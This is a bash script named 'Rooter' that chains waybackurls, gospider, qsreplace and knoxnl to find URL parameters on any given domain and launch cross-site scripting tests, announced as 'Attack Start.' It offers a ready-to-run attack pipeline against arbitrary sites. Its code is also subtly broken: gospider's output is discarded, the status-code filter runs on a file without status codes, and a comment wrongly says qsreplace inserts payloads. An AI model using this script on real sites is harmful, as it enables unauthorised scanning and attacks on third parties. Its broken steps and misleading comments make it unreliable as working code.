#!/bin/bash
echo -e "\033[1;36m"

figlet -f slant "Rooter"

echo -e "\033[0m"

# Check if a domain was provided as an argument
if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

# Set the domain
domain="$1"
# Get all URLs from the domain using waybackurls
waybackurls "$domain" > all-urls.txt
echo "Finding URLs."

# Spider the URLs using gospider
# --blacklist is used to exclude certain file types
# --other-source is used to include other sources of URLs
gospider -S all-urls.txt -c 10 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source >/dev/null
# Filter the URLs that returned a "200 OK" status code
# Extract the parameters from the URLs
# Replace the parameters with XSS payloads using qsreplace
# Save the results to a file named xss.txt
grep -e "code-200" all-urls.txt | awk '{print $5}' | grep "=" | qsreplace -a > xss.txt
echo "Finding vulnerable Endpoint."
# Test the XSS vulnerabilities using knoxnl
echo "Attack Start."
knoxnl -i xss.txt

# Clean up by removing the all-urls.txt file
rm all-urls.txt
